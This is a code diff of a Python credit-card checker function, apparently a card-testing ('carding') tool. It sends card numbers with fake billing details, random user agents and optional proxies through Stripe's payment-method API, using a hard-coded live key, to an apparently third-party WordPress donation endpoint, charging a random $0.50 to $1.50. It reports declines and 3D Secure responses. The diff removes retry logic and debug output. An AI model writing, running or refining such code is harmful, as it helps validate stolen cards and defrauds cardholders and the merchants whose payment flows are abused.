@@ -68,7 +68,7 @@ def gen_random_amount():
     cents = random.randint(50, 150)
     return f"{cents // 100}.{cents % 100:02d}"
 
-# ========== MAIN TELE FUNCTION ==========
+# ========== MAIN TELE FUNCTION (FIXED) ==========
 def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
     """
     Check credit card - returns string: "message|amount|time"
@@ -87,6 +87,7 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
     if len(yy) == 4 and yy.startswith("20"):
         yy = yy[2:4]
 
+    # ===== RANDOM AMOUNT (0.50 - 1.50) =====
     charge_amount = gen_random_amount()
 
     # Generate fake info
@@ -104,18 +105,14 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
     stripe_key = "pk_live_51ODCnuBD8XiDzI9igICxOfdXhUKRPtd7m4dnxVox4wgwab2pxtZ2uGmt2lZzQPHkWsM7U8QwYPEr1m31qVNTvuBf00ZcLWATAo"
 
     session = requests.Session()
-    
     # ✅ PROXY FIX: Proxy dict ကို session ထဲထည့်ပေး
     if proxies:
         session.proxies.update(proxies)
-        print(f"[DEBUG] Using proxy: {proxies.get('http', 'N/A')}")
-    else:
-        print("[DEBUG] No proxy - using direct connection")
         
     session.cookies.set('__stripe_mid', muid)
     session.cookies.set('__stripe_sid', sid)
 
-    # ===== STEP 1: Create Payment Method (with retry) =====
+    # ===== STEP 1: Create Payment Method =====
     url_stripe = "https://api.stripe.com/v1/payment_methods"
     stripe_data = (
         f'type=card'
@@ -146,19 +143,11 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
         'user-agent': gen_random_user_agent(),
     }
 
-    # ✅ RETRY LOGIC: 2 attempts
-    resp = None
-    for attempt in range(2):
-        try:
-            resp = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=60)
-            break
-        except Exception as e:
-            if attempt == 0:
-                print(f"[DEBUG] Retry 1 for {n[:4]}...: {e}")
-                time.sleep(2)
-            else:
-                elapsed = round(time.time() - start_time, 1)
-                return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
+    try:
+        resp = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 1)
+        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
 
     if resp.status_code != 200:
         try:
@@ -181,8 +170,6 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
             return f"Your card was declined.|{charge_amount}|{elapsed}"
         if '3d' in err_lower or 'authentication' in err_lower:
             return f"3D Secure authentication required|{charge_amount}|{elapsed}"
-        if 'too many' in err_lower:
-            return f"Too Many Requests|{charge_amount}|{elapsed}"
         return f"STRIPE_ERROR: {err_msg[:80]}|{charge_amount}|{elapsed}"
 
     try:
@@ -230,19 +217,11 @@ def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
         'X-Requested-With': 'XMLHttpRequest',
     }
 
-    # ✅ RETRY LOGIC: 2 attempts
-    r2 = None
-    for attempt in range(2):
-        try:
-            r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=60)
-            break
-        except Exception as e:
-            if attempt == 0:
-                print(f"[DEBUG] Retry 1 for WP {n[:4]}...: {e}")
-                time.sleep(2)
-            else:
-                elapsed = round(time.time() - start_time, 1)
-                return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
+    try:
+        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 1)
+        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"
 
     elapsed = round(time.time() - start_time, 1)
 
